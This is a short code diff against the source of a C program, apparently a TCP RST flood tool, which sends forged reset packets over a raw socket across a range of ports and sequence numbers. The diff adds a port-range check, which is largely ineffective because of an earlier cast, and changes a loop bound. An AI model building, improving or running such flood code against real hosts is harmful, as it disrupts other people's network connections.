@@ -77,6 +77,10 @@ int main(int argc, char *argv[])
 
     port0 = (uint16_t) atoi(argv[1]);
     port_max = (uint16_t) atoi(argv[2]);
+    if ((port0 >= USHRT_MAX) || (port_max >= USHRT_MAX)) {
+        fprintf(stderr,"0 < port0, port_max < %u\n", USHRT_MAX);
+	    exit(1);
+    }
 
     // Open raw socket without protocol header
     if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -152,7 +156,7 @@ int main(int argc, char *argv[])
     inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
 
     // RST flood loop
-    for (dport = port0; dport <= port_max; dport++) {
+    for (dport = port0; dport < port_max; dport++) {
         for (seq = seq0 ; seq < USHRT_MAX - win; seq += win) {
             tcph -> dest = htons(dport);
             cstcph -> dest = htons(dport);
